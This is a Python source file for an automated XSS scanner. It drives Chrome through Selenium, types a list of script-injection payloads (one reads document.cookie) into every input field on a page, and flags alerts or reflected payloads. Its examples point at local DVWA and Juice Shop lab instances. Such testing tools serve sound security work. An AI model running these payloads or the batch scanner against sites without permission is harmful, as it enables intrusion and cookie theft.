"""
Simple but Powerful XSS Scanner
Call with: run_xss_scan(url) in your master code
"""

import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time

# ----------------------------
# CONFIG
# ----------------------------
XSS_PAYLOADS = [
    # Basic
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    # Advanced
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    # DVWA/Juice Shop specific
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "'-alert('XSS')-'",
]

ALERT_TEXT = "XSS"
TIMEOUT = 5


# ----------------------------
# SETUP DRIVER
# ----------------------------
def _get_driver(headless=True):
    """Setup Chrome driver"""
    opts = Options()
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    if headless:
        opts.add_argument("--headless")
        opts.add_argument("--window-size=1920,1080")
    return webdriver.Chrome(options=opts)


# ----------------------------
# FIND INPUTS
# ----------------------------
def _find_inputs(driver, url):
    """Find all input fields on page"""
    print(f"\n[*] Scanning: {url}")
    inputs = []
    
    try:
        driver.get(url)
        time.sleep(2)
        
        # Find input elements
        elements = driver.find_elements(By.XPATH, 
            "//input | //textarea")
        
        for elem in elements:
            if elem.is_displayed():
                info = {
                    'type': elem.tag_name,
                    'name': elem.get_attribute('name') or '',
                    'id': elem.get_attribute('id') or '',
                    'element': elem
                }
                inputs.append(info)
                
        print(f"[+] Found {len(inputs)} input fields")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return inputs


# ----------------------------
# CHECK ALERT
# ----------------------------
def _check_alert(driver):
    """Check if XSS alert appears"""
    try:
        alert = driver.switch_to.alert
        text = alert.text
        alert.accept()
        return ALERT_TEXT in text
    except:
        return False


# ----------------------------
# TEST PAYLOAD
# ----------------------------
def _test_payload(driver, url, inputs, payload):
    """Test single payload on all inputs"""
    findings = []
    
    for inp in inputs:
        try:
            # Navigate fresh
            driver.get(url)
            time.sleep(1)
            
            # Find and fill input
            if inp['id']:
                elem = driver.find_element(By.ID, inp['id'])
            elif inp['name']:
                elem = driver.find_element(By.NAME, inp['name'])
            else:
                continue
            
            elem.clear()
            elem.send_keys(payload)
            
            # Try to submit
            try:
                submit = driver.find_element(By.XPATH, 
                    "//input[@type='submit'] | //button[@type='submit']")
                submit.click()
                time.sleep(2)
            except:
                # Try enter key
                elem.send_keys(u'\ue007')
                time.sleep(2)
            
            # Check result
            if _check_alert(driver):
                icon = "[!!!]"
                tag = "ALERT-TRIGGERED"
                findings.append({
                    'input': inp['name'] or inp['id'],
                    'payload': payload,
                    'type': 'XSS'
                })
            else:
                # Check source for reflection
                if payload in driver.page_source:
                    icon = "[?]"
                    tag = "REFLECTED"
                else:
                    icon = "[ ]"
                    tag = ""
            
            print(f"{icon} [{inp['name'] or inp['id'][:10]:10}] {payload[:40]:<40} >> {tag}")
            
        except Exception as e:
            print(f"[!] Error testing {inp.get('name')}: {str(e)[:50]}")
    
    return findings


# ----------------------------
# MAIN FUNCTION
# ----------------------------
def run_xss_scan(url, payloads=XSS_PAYLOADS, headless=True):
    """
    Main function - call this from your master code
    
    Args:
        url: URL to scan
        payloads: List of XSS payloads (optional)
        headless: Run browser in background
    
    Returns:
        List of findings with format:
        [{'input': 'search', 'payload': '<script>...', 'type': 'XSS'}, ...]
    """
    print("\n" + "="*60)
    print(f"XSS SCAN: {url}")
    print("="*60)
    
    driver = _get_driver(headless)
    findings = []
    
    try:
        # Find inputs
        inputs = _find_inputs(driver, url)
        
        if not inputs:
            print("[!] No input fields found")
            return []
        
        print(f"\n[*] Testing {len(payloads)} payloads on {len(inputs)} inputs")
        print(f"[*] Total tests: {len(payloads) * len(inputs)}")
        print("-"*60)
        
        # Test each payload
        for payload in payloads:
            result = _test_payload(driver, url, inputs, payload)
            findings.extend(result)
        
        # Summary
        print("\n" + "="*60)
        print(f"[+] SCAN COMPLETE - {len(findings)} finding(s)")
        
        if findings:
            print("\n[!] VULNERABILITIES FOUND:")
            for f in findings:
                print(f"  • Input: {f['input']}")
                print(f"    Payload: {f['payload']}")
        
        print("="*60)
        
    finally:
        driver.quit()
    
    return findings


# ----------------------------
# BATCH SCAN
# ----------------------------
def run_xss_batch(urls, **kwargs):
    """
    Scan multiple URLs in batch
    
    Args:
        urls: List of URLs
        **kwargs: Passed to run_xss_scan
    
    Returns:
        Dict with URL as key and findings as value
    """
    results = {}
    
    for i, url in enumerate(urls, 1):
        print(f"\n[{i}/{len(urls)}] Processing...")
        findings = run_xss_scan(url, **kwargs)
        results[url] = {
            'vulnerable': len(findings) > 0,
            'inputs_found': len(findings) > 0 or True,  # Simplified
            'findings': findings
        }
        time.sleep(2)  # Delay between URLs
    
    # Final summary
    print("\n" + "="*60)
    print("BATCH SCAN SUMMARY")
    print("="*60)
    
    vulnerable = [url for url, data in results.items() if data['vulnerable']]
    
    print(f"Total URLs: {len(urls)}")
    print(f"Vulnerable: {len(vulnerable)}")
    
    if vulnerable:
        print("\n[!] Vulnerable URLs:")
        for url in vulnerable:
            print(f"  • {url}")
            for f in results[url]['findings']:
                print(f"    - {f['input']}: {f['payload'][:30]}...")
    
    print("="*60)
    
    return results


# ----------------------------
# INTEGRATION EXAMPLE
# ----------------------------
if __name__ == "__main__":
    # Test URLs
    test_urls = [
        "http://127.0.0.1:8080/vulnerabilities/xss_r/",
        # "http://localhost:3000/#/search",
    ]
    
    # Single URL scan
    # findings = run_xss_scan("http://localhost/dvwa/vulnerabilities/xss_r/")
    
    # Batch scan
    results = run_xss_batch(test_urls, headless=True)